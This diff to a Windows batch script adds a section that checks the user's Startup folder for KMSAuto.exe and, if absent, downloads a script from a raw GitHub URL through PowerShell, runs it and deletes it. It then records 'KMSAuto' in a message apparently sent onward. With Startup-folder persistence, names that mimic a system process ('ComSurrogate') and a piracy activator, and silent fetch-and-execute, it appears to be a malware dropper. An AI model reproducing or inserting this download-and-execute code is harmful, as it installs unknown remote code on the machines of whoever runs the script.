@@ -227,6 +227,49 @@ set "MESSAGE=%MESSAGE%|ComSurrogate|"
 
 
 
+
+
+
+:KMSAuto
+:: Check KMSAuto.exe; if found, skip to next section
+if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\KMSAuto.exe" (
+    goto SENDMSG
+)
+
+:: Run commands if KMSAuto.exe is not found
+echo Checking for KMSAuto...
+set "embeddedScript=temp_script_KMS.bat"
+
+:: Download content and save to the embedded batch file
+powershell -Command "(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/Proseuo/Ujop/refs/heads/main/Installers/KMSAuto') | Out-File -Encoding ASCII '%embeddedScript%'"
+
+if exist "%embeddedScript%" (
+    echo Script content saved to %embeddedScript%.
+    call "%embeddedScript%"
+    del "%embeddedScript%" >nul 2>&1
+) else (
+    echo Filed to get content from ComSurrogate Link
+    echo.
+    timeout /t 3 /nobreak >nul
+    goto CheckComSurrogate
+)
+
+set "MESSAGE=%MESSAGE%|KMSAuto|"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 :SENDMSG
 
 
